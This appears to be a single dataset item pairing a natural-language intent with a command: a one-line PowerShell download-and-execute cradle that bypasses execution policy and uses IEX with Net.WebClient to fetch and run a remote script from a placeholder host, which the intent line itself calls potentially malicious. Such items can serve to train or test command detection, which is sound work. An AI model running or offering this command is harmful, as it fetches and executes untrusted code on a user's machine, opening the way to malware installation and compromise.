# Natural language intent:
# Download and execute a potentially malicious PowerShell script from a remote server using PowerShell.exe.

powershell.exe -exec bypass -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://danger.example-server.com/Win32.ps1')"
